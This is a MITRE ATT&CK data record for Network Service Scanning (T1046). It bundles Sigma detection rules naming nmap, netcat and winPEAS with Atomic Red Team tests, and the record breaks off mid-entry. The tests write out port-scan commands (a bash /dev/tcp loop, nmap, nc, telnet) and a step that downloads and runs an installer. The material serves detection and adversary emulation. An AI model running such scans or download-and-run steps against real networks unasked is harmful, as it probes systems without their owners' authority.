{
    "id": "T1046",
    "name": "Network Service Scanning",
    "description": "Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation. Methods to acquire this information include port scans and vulnerability scans using tools that are brought onto a system.\nWithin cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.",
    "platforms": "Windows, IaaS, Linux, macOS, Containers",
    "kill_chain_phases": "Discovery",
    "data_sources": "Command: Command Execution, Cloud Service: Cloud Service Enumeration, Network Traffic: Network Traffic Flow",
    "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\nNormal, benign system and network events from legitimate remote service scanning may be uncommon, depending on the environment and how they are used. Legitimate open port and vulnerability scanning may be conducted within the environment and will need to be deconflicted with any detection capabilities developed. Network intrusion detection systems can also be used to identify scanning activity. Monitor for process use of the networks and inspect intra-network flows to detect port scans.",
    "url": "https://attack.mitre.org/techniques/T1046",
    "enrichments": {
        "attack_rule_map": [],
        "cycat": {
            "cycat": {
                "cycat_related_uuids": [
                    "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
                    "fed85bf9-e075-4280-9159-fbe8a023d6fa",
                    "0319b483-5973-4932-91ea-5a44c2975b24",
                    "bef0bc5a-b9ae-425d-85c6-7b2d705980c6",
                    "e3a12395-188d-4051-9a16-ea8e14d07b88",
                    "54773c5f-f1cc-4703-9126-2f797d96a69d",
                    "3761e026-f259-44e6-8826-719ed8079408",
                    "3e102cd9-a70d-4a7a-9508-403963092f31",
                    "bef37fa2-f205-4a7b-b484-0759bfd5f86f",
                    "f6ecd1cf-19b8-4488-97f6-00f0924991a3",
                    "4601eaec-6b45-4052-ad32-2d96d26ce0d8",
                    "84bae5d4-b518-4ae0-b331-6d4afd34d00f",
                    "fab0ddf0-b8a9-4d70-91ce-a20547209afb",
                    "5d6e7aa3-aca4-46cc-b96a-46ac950d210f",
                    "98b53e78-ebaf-46f8-be06-421aafd176d9",
                    "d256cb63-b021-4b4a-bb6d-1b42eea179a3",
                    "5e78dc2c-afc8-411f-94a5-40bb950d210f"
                ],
                "lookup_results": [
                    {
                        "uuid": "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
                        "lookup_data": {
                            "description": "Dissecting PlugX to Extract Its Crown Jewels",
                            "link": "https://www.circl.lu/doc/misp/feed-osint/5eeec9aa-9d88-4ece-9e6f-9d92884ae404.json",
                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
                            "timestamp": "1663580963",
                            "uuid": "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "fed85bf9-e075-4280-9159-fbe8a023d6fa",
                        "lookup_data": {
                            "description": "Detects the use of Advanced IP Scanner. Seems to be a popular tool for ransomware groups.",
                            "raw": "author: '@ROxPinTeddy'\ndate: 2020/05/12\ndescription: Detects the use of Advanced IP Scanner. Seems to be a popular tool for\n  ransomware groups.\ndetection:\n  condition: selection\n  selection:\n    TargetFilename|contains: \\AppData\\Local\\Temp\\Advanced IP Scanner 2\nfalsepositives:\n- Legitimate administrative use\nid: fed85bf9-e075-4280-9159-fbe8a023d6fa\nlevel: medium\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2022/11/29\nreferences:\n- https://news.sophos.com/en-us/2019/12/09/snatch-ransomware-reboots-pcs-into-safe-mode-to-bypass-protection/\n- https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html\n- https://labs.f-secure.com/blog/prelude-to-ransomware-systembc\n- https://assets.documentcloud.org/documents/20444693/fbi-pin-egregor-ransomware-bc-01062021.pdf\n- https://thedfirreport.com/2021/01/18/all-that-for-a-coinminer\nrelated:\n- id: bef37fa2-f205-4a7b-b484-0759bfd5f86f\n  type: derived\nstatus: test\ntags:\n- attack.discovery\n- attack.t1046\ntitle: Advanced IP Scanner - File Event\n",
                            "sigma:id": "fed85bf9-e075-4280-9159-fbe8a023d6fa",
                            "title": "Advanced IP Scanner - File Event",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "0319b483-5973-4932-91ea-5a44c2975b24",
                        "lookup_data": {
                            "description": "Conti Ransomware",
                            "link": "http://www.botvrij.eu/data/feed-osint/0319b483-5973-4932-91ea-5a44c2975b24.json",
                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
                            "timestamp": "1621181463",
                            "uuid": "0319b483-5973-4932-91ea-5a44c2975b24",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "bef0bc5a-b9ae-425d-85c6-7b2d705980c6",
                        "lookup_data": {
                            "description": "Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation",
                            "raw": "author: frack113\ndate: 2021/12/10\ndescription: Adversaries may attempt to get a listing of services running on remote\n  hosts, including those that may be vulnerable to remote software exploitation\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_conda:\n    CommandLine|contains|all:\n    - C:\\ProgramData\\Anaconda3\\Scripts\\conda-script.py\n    - update\n    ParentImage: C:\\ProgramData\\Anaconda3\\Scripts\\conda.exe\n  filter_conda_jupyter_notebook:\n    CommandLine|contains: C:\\ProgramData\\Anaconda3\\Scripts\\jupyter-notebook-script.py\n    ParentImage: C:\\ProgramData\\Anaconda3\\python.exe\n  filter_local_communication:\n    DestinationIp: 127.0.0.1\n    SourceIp: 127.0.0.1\n  selection:\n    Image|contains: python\n    Initiated: 'true'\nfalsepositives:\n- Legitimate python script\nid: bef0bc5a-b9ae-425d-85c6-7b2d705980c6\nlevel: medium\nlogsource:\n  category: network_connection\n  product: windows\nmodified: 2022/09/20\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1046/T1046.md#atomic-test-4---port-scan-using-python\n- https://pypi.org/project/scapy/\nstatus: experimental\ntags:\n- attack.discovery\n- attack.t1046\ntitle: Python Initiated Connection\n",
                            "sigma:id": "bef0bc5a-b9ae-425d-85c6-7b2d705980c6",
                            "title": "Python Initiated Connection",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "e3a12395-188d-4051-9a16-ea8e14d07b88",
                        "lookup_data": {
                            "capec": "CAPEC-300",
                            "mitre-attack-id": "T1046",
                            "mitre-cti:description": "Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port and/or vulnerability scans using tools that are brought onto a system.(Citation: CISA AR21-126A FIVEHANDS May 2021)   \n\nWithin cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.\n\nWithin macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a hostâ€™s registered services on the network. For example, adversaries can use a mDNS query (such as <code>dns-sd -B _ssh._tcp .</code>) to find other systems broadcasting the ssh service.(Citation: apple doco bonjour description)(Citation: macOS APT Activity Bradley)",
                            "mitre-cti:name": "Network Service Discovery",
                            "mitre-cti:type": "attack-pattern",
                            "raw": "{'x_mitre_platforms': ['Windows', 'IaaS', 'Linux', 'macOS', 'Containers', 'Network'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['Praetorian'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'type': 'attack-pattern', 'id': 'attack-pattern--e3a12395-188d-4051-9a16-ea8e14d07b88', 'created': '2017-05-31T21:30:43.915Z', 'x_mitre_version': '3.0', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1046', 'url': 'https://attack.mitre.org/techniques/T1046'}, {'source_name': 'apple doco bonjour description', 'url': 'https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/NetServices/Introduction.html', 'description': 'Apple Inc. (2013, April 23). Bonjour Overview. Retrieved October 11, 2021.'}, {'source_name': 'CISA AR21-126A FIVEHANDS May 2021', 'url': 'https://us-cert.cisa.gov/ncas/analysis-reports/ar21-126a', 'description': 'CISA. (2021, May 6). Analysis Report (AR21-126A) FiveHands Ransomware. Retrieved June 7, 2021.'}, {'source_name': 'macOS APT Activity Bradley', 'url': 'https://themittenmac.com/what-does-apt-activity-look-like-on-macos/', 'description': 'Jaron Bradley. (2021, November 14). What does APT Activity Look Like on macOS?. Retrieved January 19, 2022.'}, {'url': 'https://capec.mitre.org/data/definitions/300.html', 'source_name': 'capec', 'external_id': 'CAPEC-300'}], 'x_mitre_deprecated': False, 'revoked': False, 'description': 'Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port and/or vulnerability scans using tools that are brought onto a system.(Citation: CISA AR21-126A FIVEHANDS May 2021)   \\n\\nWithin cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.\\n\\nWithin macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a hostâ€™s registered services on the network. For example, adversaries can use a mDNS query (such as <code>dns-sd -B _ssh._tcp .</code>) to find other systems broadcasting the ssh service.(Citation: apple doco bonjour description)(Citation: macOS APT Activity Bradley)', 'modified': '2022-04-20T16:05:30.960Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'name': 'Network Service Discovery', 'x_mitre_detection': 'System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\\n\\nNormal, benign system and network events from legitimate remote service scanning may be uncommon, depending on the environment and how they are used. Legitimate open port and vulnerability scanning may be conducted within the environment and will need to be deconflicted with any detection capabilities developed. Network intrusion detection systems can also be used to identify scanning activity. Monitor for process use of the networks and inspect intra-network flows to detect port scans.', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'discovery'}], 'x_mitre_is_subtechnique': False, 'x_mitre_data_sources': ['Cloud Service: Cloud Service Enumeration', 'Network Traffic: Network Traffic Flow', 'Command: Command Execution'], 'x_mitre_attack_spec_version': '2.1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "54773c5f-f1cc-4703-9126-2f797d96a69d",
                        "lookup_data": {
                            "description": "Detects the use of Advanced Port Scanner.",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2021/12/18\ndescription: Detects the use of Advanced Port Scanner.\ndetection:\n  condition: 1 of selection*\n  selection1:\n  - Image|contains: \\advanced_port_scanner\n  - OriginalFileName|contains: advanced_port_scanner\n  - Description|contains: Advanced Port Scanner\n  selection2:\n    CommandLine|contains|all:\n    - /portable\n    - /lng\nfalsepositives:\n- Legitimate administrative use\n- Tools with similar commandline (very rare)\nid: 54773c5f-f1cc-4703-9126-2f797d96a69d\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/11\nreferences:\n- https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Other/Advanced%20Port%20Scanner\nstatus: experimental\ntags:\n- attack.discovery\n- attack.t1046\n- attack.t1135\ntitle: Advanced Port Scanner\n",
                            "sigma:id": "54773c5f-f1cc-4703-9126-2f797d96a69d",
                            "title": "Advanced Port Scanner",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "3761e026-f259-44e6-8826-719ed8079408",
                        "lookup_data": {
                            "description": "Detects enumeration of local or remote network services.",
                            "raw": "author: Alejandro Ortuno, oscd.community\ndate: 2020/10/21\ndescription: Detects enumeration of local or remote network services.\ndetection:\n  condition: selection\n  selection:\n    exe|endswith:\n    - /telnet\n    - /nmap\n    - /netcat\n    - /nc\n    key: network_connect_4\n    type: SYSCALL\nfalsepositives:\n- Legitimate administration activities\nid: 3761e026-f259-44e6-8826-719ed8079408\nlevel: low\nlogsource:\n  definition: Configure these rules https://github.com/Neo23x0/auditd/blob/e181243a7c708e9d579557d6f80e0ed3d3483b89/audit.rules#L182-L183\n  product: linux\n  service: auditd\nmodified: 2022/11/26\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1046/T1046.md\nrelated:\n- id: 3e102cd9-a70d-4a7a-9508-403963092f31\n  type: derived\nstatus: test\ntags:\n- attack.discovery\n- attack.t1046\ntitle: Linux Network Service Scanning - Auditd\n",
                            "sigma:id": "3761e026-f259-44e6-8826-719ed8079408",
                            "title": "Linux Network Service Scanning - Auditd",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "3e102cd9-a70d-4a7a-9508-403963092f31",
                        "lookup_data": {
                            "description": "Detects enumeration of local or remote network services.",
                            "raw": "author: Alejandro Ortuno, oscd.community\ndate: 2020/10/21\ndescription: Detects enumeration of local or remote network services.\ndetection:\n  condition: (netcat and not netcat_listen_flag) or network_scanning_tools\n  netcat:\n    Image|endswith:\n    - /nc\n    - /netcat\n  netcat_listen_flag:\n    CommandLine|contains: l\n  network_scanning_tools:\n    Image|endswith:\n    - /telnet\n    - /nmap\nfalsepositives:\n- Legitimate administration activities\nid: 3e102cd9-a70d-4a7a-9508-403963092f31\nlevel: low\nlogsource:\n  category: process_creation\n  definition: Detect netcat and filter our listening mode\n  product: linux\nmodified: 2022/10/09\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1046/T1046.md\nstatus: test\ntags:\n- attack.discovery\n- attack.t1046\ntitle: Linux Network Service Scanning\n",
                            "sigma:id": "3e102cd9-a70d-4a7a-9508-403963092f31",
                            "title": "Linux Network Service Scanning",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "bef37fa2-f205-4a7b-b484-0759bfd5f86f",
                        "lookup_data": {
                            "description": "Detects the use of Advanced IP Scanner. Seems to be a popular tool for ransomware groups.",
                            "raw": "author: '@ROxPinTeddy, Nasreddine Bencherchali'\ndate: 2020/05/12\ndescription: Detects the use of Advanced IP Scanner. Seems to be a popular tool for\n  ransomware groups.\ndetection:\n  condition: 1 of selection*\n  selection1:\n  - Image|contains: \\advanced_ip_scanner\n  - OriginalFileName|contains: advanced_ip_scanner\n  - Description|contains: Advanced IP Scanner\n  selection2:\n    CommandLine|contains|all:\n    - /portable\n    - /lng\nfalsepositives:\n- Legitimate administrative use\nid: bef37fa2-f205-4a7b-b484-0759bfd5f86f\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/11\nreferences:\n- https://news.sophos.com/en-us/2019/12/09/snatch-ransomware-reboots-pcs-into-safe-mode-to-bypass-protection/\n- https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html\n- https://labs.f-secure.com/blog/prelude-to-ransomware-systembc\n- https://assets.documentcloud.org/documents/20444693/fbi-pin-egregor-ransomware-bc-01062021.pdf\n- https://thedfirreport.com/2021/01/18/all-that-for-a-coinminer\n- https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Other/Advanced%20IP%20Scanner\nstatus: experimental\ntags:\n- attack.discovery\n- attack.t1046\n- attack.t1135\ntitle: Advanced IP Scanner\n",
                            "sigma:id": "bef37fa2-f205-4a7b-b484-0759bfd5f86f",
                            "title": "Advanced IP Scanner",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "f6ecd1cf-19b8-4488-97f6-00f0924991a3",
                        "lookup_data": {
                            "description": "Detects usage of namp/zenmap. Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation",
                            "raw": "author: frack113\ndate: 2021/12/10\ndescription: Detects usage of namp/zenmap. Adversaries may attempt to get a listing\n  of services running on remote hosts, including those that may be vulnerable to remote\n  software exploitation\ndetection:\n  condition: selection\n  selection:\n  - Image|endswith:\n    - \\nmap.exe\n    - \\zennmap.exe\n  - OriginalFileName:\n    - nmap.exe\n    - zennmap.exe\nfalsepositives:\n- Network administrator computer\nid: f6ecd1cf-19b8-4488-97f6-00f0924991a3\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/30\nreferences:\n- https://nmap.org/\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1046/T1046.md#atomic-test-3---port-scan-nmap-for-windows\nstatus: test\ntags:\n- attack.discovery\n- attack.t1046\ntitle: Nmap/Zenmap Execution\n",
                            "sigma:id": "f6ecd1cf-19b8-4488-97f6-00f0924991a3",
                            "title": "Nmap/Zenmap Execution",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "4601eaec-6b45-4052-ad32-2d96d26ce0d8",
                        "lookup_data": {
                            "description": "Detects many failed connection attempts to different ports or hosts",
                            "raw": "author: Thomas Patzke\ndate: 2017/02/19\ndescription: Detects many failed connection attempts to different ports or hosts\ndetection:\n  condition: selection | count(dst_ip) by src_ip > 10\n  selection:\n    action: denied\n  timeframe: 24h\nfalsepositives:\n- Inventarization systems\n- Vulnerability scans\nfields:\n- src_ip\n- dst_ip\n- dst_port\nid: 4601eaec-6b45-4052-ad32-2d96d26ce0d8\nlevel: medium\nlogsource:\n  category: firewall\nmodified: 2021/11/27\nstatus: test\ntags:\n- attack.discovery\n- attack.t1046\ntitle: Network Scans Count By Destination IP\n",
                            "sigma:id": "4601eaec-6b45-4052-ad32-2d96d26ce0d8",
                            "title": "Network Scans Count By Destination IP",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "84bae5d4-b518-4ae0-b331-6d4afd34d00f",
                        "lookup_data": {
                            "description": "Detects enumeration of local or remote network services.",
                            "raw": "author: Alejandro Ortuno, oscd.community\ndate: 2020/10/21\ndescription: Detects enumeration of local or remote network services.\ndetection:\n  condition: (selection_1 and not filter) or selection_2\n  filter:\n    CommandLine|contains: l\n  selection_1:\n    Image|endswith:\n    - /nc\n    - /netcat\n  selection_2:\n    Image|endswith:\n    - /nmap\n    - /telnet\nfalsepositives:\n- Legitimate administration activities\nid: 84bae5d4-b518-4ae0-b331-6d4afd34d00f\nlevel: low\nlogsource:\n  category: process_creation\n  product: macos\nmodified: 2021/11/27\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1046/T1046.md\nstatus: test\ntags:\n- attack.discovery\n- attack.t1046\ntitle: MacOS Network Service Scanning\n",
                            "sigma:id": "84bae5d4-b518-4ae0-b331-6d4afd34d00f",
                            "title": "MacOS Network Service Scanning",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "fab0ddf0-b8a9-4d70-91ce-a20547209afb",
                        "lookup_data": {
                            "description": "Detects many failed connection attempts to different ports or hosts",
                            "raw": "author: Thomas Patzke\ndate: 2017/02/19\ndescription: Detects many failed connection attempts to different ports or hosts\ndetection:\n  condition: selection | count(dst_port) by src_ip > 10\n  selection:\n    action: denied\n  timeframe: 24h\nfalsepositives:\n- Inventarization systems\n- Vulnerability scans\nfields:\n- src_ip\n- dst_ip\n- dst_port\nid: fab0ddf0-b8a9-4d70-91ce-a20547209afb\nlevel: medium\nlogsource:\n  category: firewall\nmodified: 2022/10/09\nstatus: test\ntags:\n- attack.discovery\n- attack.t1046\ntitle: Network Scans Count By Destination Port\n",
                            "sigma:id": "fab0ddf0-b8a9-4d70-91ce-a20547209afb",
                            "title": "Network Scans Count By Destination Port",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5d6e7aa3-aca4-46cc-b96a-46ac950d210f",
                        "lookup_data": {
                            "description": "SectorJ04 GroupÃ¢â‚¬â„¢s Increased Activity in 2019",
                            "link": "https://www.circl.lu/doc/misp/feed-osint/5d6e7aa3-aca4-46cc-b96a-46ac950d210f.json",
                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
                            "timestamp": "1568039252",
                            "uuid": "5d6e7aa3-aca4-46cc-b96a-46ac950d210f",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "98b53e78-ebaf-46f8-be06-421aafd176d9",
                        "lookup_data": {
                            "description": "WinPEAS is a script that search for possible paths to escalate privileges on Windows hosts. The checks are explained on book.hacktricks.xyz",
                            "raw": "author: Georg Lauenstein\ndate: 2022/09/19\ndescription: WinPEAS is a script that search for possible paths to escalate privileges\n  on Windows hosts. The checks are explained on book.hacktricks.xyz\ndetection:\n  condition: 1 of selection*\n  selection_basic:\n    Image|endswith:\n    - \\winPEASany.exe\n    - \\winPEASany_ofs.exe\n    - \\winPEASx64.exe\n    - \\winPEASx64_ofs.exe\n    - \\winPEASx86.exe\n    - \\winPEASx86_ofs.exe\n  selection_option:\n  - CommandLine|endswith:\n    - serviceinfo\n    - applicationsinfo\n    - windowscreds\n    - 'browserinfo '\n    - fileanalysis\n  - CommandLine|contains: '.exe browserinfo '\n  selection_pe:\n    OriginalFileName: winPEAS.exe\nfalsepositives:\n- Other programs that use the same command line flags\nid: 98b53e78-ebaf-46f8-be06-421aafd176d9\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://github.com/carlospolop/PEASS-ng\n- https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation\nstatus: experimental\ntags:\n- attack.privilege_escalation\n- attack.t1082\n- attack.t1087\n- attack.t1046\ntitle: Detect Execution of winPEAS\n",
                            "sigma:id": "98b53e78-ebaf-46f8-be06-421aafd176d9",
                            "title": "Detect Execution of winPEAS",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "d256cb63-b021-4b4a-bb6d-1b42eea179a3",
                        "lookup_data": {
                            "mitre-attack-id": "T1046",
                            "mitre-cti:description": "Use network intrusion detection/prevention systems to detect and prevent remote service scans. Ensure that unnecessary ports and services are closed and proper network segmentation is followed to protect critical servers and devices.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to acquire information about services running on remote systems, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",
                            "mitre-cti:name": "Network Service Scanning Mitigation",
                            "mitre-cti:type": "course-of-action",
                            "raw": "{'x_mitre_domains': ['enterprise-attack'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'course-of-action--d256cb63-b021-4b4a-bb6d-1b42eea179a3', 'type': 'course-of-action', 'created': '2018-10-17T00:14:20.652Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'external_id': 'T1046', 'url': 'https://attack.mitre.org/mitigations/T1046', 'source_name': 'mitre-attack'}, {'source_name': 'Beechey 2010', 'description': 'Beechey, J. (2010, December). Application Whitelisting: Panacea or Propaganda?. Retrieved November 18, 2014.', 'url': 'http://www.sans.org/reading-room/whitepapers/application/application-whitelisting-panacea-propaganda-33599'}, {'url': 'https://blogs.jpcert.or.jp/en/2016/01/windows-commands-abused-by-attackers.html', 'description': 'Tomonaga, S. (2016, January 26). Windows Commands Abused by Attackers. Retrieved February 2, 2016.', 'source_name': 'Windows Commands JPCERT'}, {'url': 'https://apps.nsa.gov/iaarchive/library/ia-guidance/tech-briefs/application-whitelisting-using-microsoft-applocker.cfm', 'description': 'NSA Information Assurance Directorate. (2014, August). Application Whitelisting Using Microsoft AppLocker. Retrieved March 31, 2016.', 'source_name': 'NSA MS AppLocker'}, {'source_name': 'Corio 2008', 'description': 'Corio, C., & Sayana, D. P. (2008, June). Application Lockdown with Software Restriction Policies. Retrieved November 18, 2014.', 'url': 'http://technet.microsoft.com/en-us/magazine/2008.06.srp.aspx'}, {'source_name': 'TechNet Applocker vs SRP', 'description': 'Microsoft. (2012, June 27). Using Software Restriction Policies and AppLocker Policies. Retrieved April 7, 2016.', 'url': 'https://technet.microsoft.com/en-us/library/ee791851.aspx'}], 'modified': '2021-08-23T20:25:19.750Z', 'name': 'Network Service Scanning Mitigation', 'description': 'Use network intrusion detection/prevention systems to detect and prevent remote service scans. Ensure that unnecessary ports and services are closed and proper network segmentation is followed to protect critical servers and devices.\\n\\nIdentify unnecessary system utilities or potentially malicious software that may be used to acquire information about services running on remote systems, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)', 'x_mitre_deprecated': True, 'x_mitre_version': '1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5e78dc2c-afc8-411f-94a5-40bb950d210f",
                        "lookup_data": {
                            "description": "Trickbot to Ryuk in Two Hours",
                            "link": "https://www.circl.lu/doc/misp/feed-osint/5e78dc2c-afc8-411f-94a5-40bb950d210f.json",
                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
                            "timestamp": "1585237597",
                            "uuid": "5e78dc2c-afc8-411f-94a5-40bb950d210f",
                            "_cycat_type": "Item"
                        }
                    }
                ]
            }
        },
        "atomics": [
            {
                "attack_technique": "T1046",
                "display_name": "Network Service Discovery",
                "atomic_tests": [
                    {
                        "name": "Port Scan",
                        "auto_generated_guid": "68e907da-2539-48f6-9fc9-257a78c05540",
                        "description": "Scan ports to check for listening ports.\n\nUpon successful execution, sh will perform a network connection against a single host (192.168.1.1) and determine what ports are open in the range of 1-65535. Results will be via stdout.\n",
                        "supported_platforms": [
                            "linux",
                            "macos"
                        ],
                        "input_arguments": {
                            "host": {
                                "description": "Host to scan.",
                                "type": "string",
                                "default": "192.168.1.1"
                            }
                        },
                        "executor": {
                            "command": "for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/#{host}/$port) && echo port $port is open ; done\n",
                            "name": "bash"
                        }
                    },
                    {
                        "name": "Port Scan Nmap",
                        "auto_generated_guid": "515942b0-a09f-4163-a7bb-22fefb6f185f",
                        "description": "Scan ports to check for listening ports with Nmap.\nUpon successful execution, sh will utilize nmap, telnet, and nc to contact a single or range of addresses on port 80 to determine if listening. Results will be via stdout.\n",
                        "supported_platforms": [
                            "linux",
                            "macos"
                        ],
                        "input_arguments": {
                            "host": {
                                "description": "Host to scan.",
                                "type": "string",
                                "default": "192.168.1.1"
                            },
                            "port": {
                                "description": "Ports to scan.",
                                "type": "string",
                                "default": "80"
                            },
                            "network_range": {
                                "description": "Network Range to Scan.",
                                "type": "string",
                                "default": "192.168.1.0/24"
                            }
                        },
                        "dependency_executor_name": "sh",
                        "dependencies": [
                            {
                                "description": "Check if nmap command exists on the machine\n",
                                "prereq_command": "if [ -x \"$(command -v nmap)\" ]; then exit 0; else exit 1; fi;\n",
                                "get_prereq_command": "(which yum && yum -y install epel-release nmap)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y nmap)||(which pkg && pkg install -y nmap)\n"
                            },
                            {
                                "description": "Check if nc command exists on the machine\n",
                                "prereq_command": "if [ -x \"$(command -v nc)\" ]; then exit 0; else exit 1; fi;\n",
                                "get_prereq_command": "(which yum && yum -y install epel-release nc)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y netcat)||(which pkg && pkg install -y netcat)\n"
                            },
                            {
                                "description": "Check if telnet command exists on the machine\n",
                                "prereq_command": "if [ -x \"$(command -v telnet)\" ]; then exit 0; else exit 1; fi;\n",
                                "get_prereq_command": "(which yum && yum -y install epel-release telnet)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y telnet)\n"
                            }
                        ],
                        "executor": {
                            "command": "sudo nmap -sS #{network_range} -p #{port}\ntelnet #{host} #{port}\nnc -nv #{host} #{port}\n",
                            "name": "sh",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Port Scan NMap for Windows",
                        "auto_generated_guid": "d696a3cb-d7a8-4976-8eb5-5af4abf2e3df",
                        "description": "Scan ports to check for listening ports for the local host 127.0.0.1",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "nmap_url": {
                                "description": "NMap installer download URL",
                                "type": "url",
                                "default": "https://nmap.org/dist/nmap-7.80-setup.exe"
                            },
                            "host_to_scan": {
                                "description": "The host to scan with NMap",
                                "type": "string",
                                "default": "127.0.0.1"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "NMap must be installed\n",
                                "prereq_command": "if (cmd /c \"nmap 2>nul\") {exit 0} else {exit 1}",
                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\nmap-7.80-setup.exe\" #{nmap_url}\nStart-Process \"PathToAtomicsFolder\\..\\ExternalPayloads\\nmap-7.80-setup.exe\" /S\n"
                            }
                        ],
                        "executor": {
                            "command": "nmap #{host_to_scan}",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Port Scan using python",
                        "auto_generated_guid": "6ca45b04-9f15-4424-b9d3-84a217285a5c",
                        "description": "Scan ports to check for listening ports with python\n",
                        "supported_platforms": [
                            "windows"
                        ],
